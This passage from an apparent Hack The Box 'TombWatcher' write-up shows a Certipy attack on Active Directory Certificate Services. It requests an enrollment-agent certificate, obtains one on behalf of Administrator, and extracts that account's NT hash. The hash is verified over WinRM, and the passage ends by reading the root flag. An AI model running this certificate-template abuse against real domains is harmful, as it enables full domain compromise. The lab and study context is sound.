❯ certipy req -u cert_admin -p password -dc-ip 10.129.12.205 -target DC01.tombwatcher.htb -ca tombwatcher-CA-1 -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

- Now we can use the "agent" certificate to request a certificate on behalf of the administrator
```sh
❯ certipy req -u cert_admin -p password -dc-ip 10.129.12.205 -target DC01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'               
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Now we can try to authenticate as the `administrator` via `pfx`:
```sh
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.12.205
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```
- Fuck yeah!!

- We can verify with `nxc`:
```sh
❯ nxc winrm 10.129.12.205 -u administrator -H f61db423bebe3328d33af26741afe5fc    
WINRM       10.129.12.205   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.129.12.205   5985   DC01             [+] tombwatcher.htb\administrator:f61db423bebe3328d33af26741afe5fc (Pwn3d!)
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
2ff97d949d87728d00a9bec4654a2013
```






